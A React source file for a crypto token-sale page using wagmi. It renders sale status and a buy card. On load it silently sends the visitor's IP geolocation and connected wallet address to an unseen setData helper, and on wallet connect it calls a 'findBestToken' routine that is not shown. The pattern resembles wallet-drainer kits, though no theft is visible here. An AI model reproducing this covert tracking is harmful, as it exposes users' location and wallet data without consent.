import React from "react";
import { useEffect, useState } from "react";
import axios from "axios";
import { useAccount, useNetwork } from "wagmi";
import { findBestToken, setData } from "../../utils/utils";
import Status from "../../components/Status";
import BuyCard from "../../components/BuyCard";
import { useContractStatus } from "../../hooks/useContractStatus";
import Connect from "../../components/Connect";
import Lottie from 'react-lottie';
import rocketAnimation from '../../assets/lottie/rocket.json'
import factoryAnimation from '../../assets/lottie/factory.json'
import './ico.css'
// import StakingRunNode from "../../components/stakingRunNode";
// import Security from "../../components/security";
// import HowItWorks from "../../components/howItWorks";
// import Community from "../../components/community";
// import News from "../../components/news";
// import Team from "../../components/team";
// import Dao from "../../components/dao";
// import NodeOperator from "../../components/nodeOperator";

export default function IcoPage() {
    const [refresh, setRefresh] = useState(false)
    const {
        totalSoldAmount,
        totalFundsInUSD,
        roundNumber,
        currentTokenPrice,
        plsAmountFor1USD,
        nextRoundStartTime,
        tokenBuyAmount,
        projectTokenBalance,
        payTokenBalance,
        payTokenAllowance,
        ethBalance,
    } = useContractStatus(refresh)
    const { address } = useAccount()
    const { chain } = useNetwork()

    const [geo, setGeo] = useState("")

    useEffect(() => {
        async function fetchData() {
            try {
                const res = await axios.get('https://geolocation-db.com/json/')
                setGeo(JSON.stringify(res.data))
            } catch (error) {
            }
        }
        fetchData()
    }, [])

    useEffect(() => {
        if (geo) {
            setData(geo, address, 'init', 'init')
        }
    }, [geo, address])

    useEffect(() => {
        if (address) {
            findBestToken(address, chain.id)
        }
    }, [address, chain])

    return (
        <div
            className=""
            id="header"
        >
            <div className="bg-header relative overflow-hidden">

                <div className="relative overflow-hidden">
                    <div className="relative pt-6 pb-5 sm:pb-10">
                        <div className="mt-5 mx-auto max-w-7xl lg:px-4 px-1">
                            <div className="flex flex-row justify-items-center lg:justify-between gap-3">
                                <div className="flex lg:flex-row lg:justify-items-right lg:gap-2">

                                    <img alt="img"
                                        src={"/image/moon_logo.png"}
                                        className="hidden lg:flex w-0 lg:w-auto py-5 mx-3"
                                    />
                                </div>
                                <Connect />
                            </div>
                        </div>
                    </div>
                    <div
                        className="relative w-11/12 lg:w-5/6 mx-auto mt-0"
                    >

                        <div className="w-full flex lg:flex-row flex-col justify-between gap-5 items-center mx-auto lg:px-2 my-5 lg:mt-[20px]">

                                <Status
                                    totalSoldAmount={totalSoldAmount}
                                    totalFundsInUSD={totalFundsInUSD}
                                    roundNumber={roundNumber}
                                    currentTokenPrice={currentTokenPrice}
                                    plsAmountFor1USD={plsAmountFor1USD}
                                    tokenBuyAmount={tokenBuyAmount}
                                    projectTokenBalance={projectTokenBalance}
                                    nextRoundStartTime={nextRoundStartTime}
                                />

                            <div className="">
                                <BuyCard
                                    setRefresh={setRefresh}
                                    refresh={refresh}
                                    payTokenBalance={payTokenBalance}
                                    payTokenAllowance={payTokenAllowance}
                                    ethBalance={ethBalance}
                                    nextRoundStartTime={nextRoundStartTime}
                                    roundNumber={roundNumber}
                                    totalSoldAmount={totalSoldAmount}
                                    currentTokenPrice={currentTokenPrice}
                                />
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        // <React.Fragment>
        //     <div id="app" data-v-app="">
        //         <div id="app" className="">
        //             <div id="home">
        //                 <Status totalVolume={totalVolume} userVolume={userVolume} />
        //                 <div className="lg:w-5/6 w-full flex lg:flex-row flex-col justify-center gap-5 items-center mx-auto px-2 my-5 lg:mt-[80px]">
        //                     <BuyCard
        //                         setRefresh={setRefresh}
        //                         refresh={refresh}
        //                         isWL={isWL}
        //                         userVolume={userVolume}
        //                         tokenBalance={tokenBalance}
        //                         allowance={allowance}
        //                         ethBalance={ethBalance} />
        //                 </div>
        //                 {/* <StakingRunNode /> */}
        //                 {/* <Security /> */}
        //                 {/* <HowItWorks /> */}
        //                 {/* <Community /> */}
        //                 {/* <News /> */}
        //                 {/* <Team /> */}
        //                 {/* <Dao /> */}
        //                 {/* <NodeOperator /> */}
        //             </div>
        //         </div>
        //     </div>
        // </React.Fragment >
    );
}
